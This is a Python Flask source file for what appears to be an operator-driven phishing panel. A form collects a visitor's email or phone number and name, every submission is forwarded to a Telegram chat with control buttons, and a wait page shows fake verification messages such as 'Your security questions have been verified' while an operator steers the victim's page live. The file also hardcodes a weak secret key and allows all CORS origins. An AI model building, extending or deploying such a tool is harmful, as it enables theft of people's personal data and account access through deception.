# app.py

from flask import Flask, request, render_template_string
from flask_socketio import SocketIO
import threading, uuid, asyncio

from state import user_rooms
from page_templates import MAIN_PAGE, WAIT_PAGE
from socket_handlers import register_socket_handlers
import telegram_handlers

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ---------------- ASYNC TELEGRAM LOOP ----------------
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def start_loop():
    asyncio.set_event_loop(loop)
    loop.run_forever()

threading.Thread(target=start_loop, daemon=True).start()

def run_async_task(coro):
    asyncio.run_coroutine_threadsafe(coro, loop)

# expose function globally for telegram_handlers
update_user_page = register_socket_handlers(socketio)
telegram_handlers.update_user_page = update_user_page


# ---------------- ROUTES ----------------
@app.route("/", methods=["GET", "POST"])
def main_form():
    if request.method == "POST":
        email = request.form.get("email")
        name = request.form.get("name")

        room_id = str(uuid.uuid4())

        user_rooms[room_id] = {
            "email": email,
            "name": name,
            "greeting": "Your security questions have been verified.",
            "expect_greeting": False
        }

        kb = telegram_handlers.build_keyboard(room_id)

        run_async_task(
            telegram_handlers.ApplicationBuilder().token(telegram_handlers.BOT_TOKEN)
        )

        telegram_handlers.run_async_task(
            telegram_handlers.telegram_bot.send_message(
                chat_id=telegram_handlers.CHAT_ID,
                text=f"🧾 New Submission\nRoom: {room_id}\nEmail/Number: {email}\nName: {name}",
                reply_markup=kb
            )
        )

        return render_template_string(WAIT_PAGE, room_id=room_id)

    return render_template_string(MAIN_PAGE)


@app.route("/verify_email", methods=["POST"])
def verify_email():
    room_id = request.form.get("room_id")
    verified_email = request.form.get("verified_email")

    user = user_rooms.get(room_id)
    if user:
        user["email"] = verified_email

    telegram_handlers.run_async_task(
        telegram_handlers.telegram_bot.send_message(
            chat_id=telegram_handlers.CHAT_ID,
            text=f"Email Verified\nRoom: {room_id}\nEmail: {verified_email}"
        )
    )

    return render_template_string(WAIT_PAGE, room_id=room_id)


if __name__ == "__main__":
    threading.Thread(target=telegram_handlers.start_telegram_bot, daemon=True).start()
    socketio.run(app, host="0.0.0.0", port=10000, allow_unsafe_werkzeug=True)
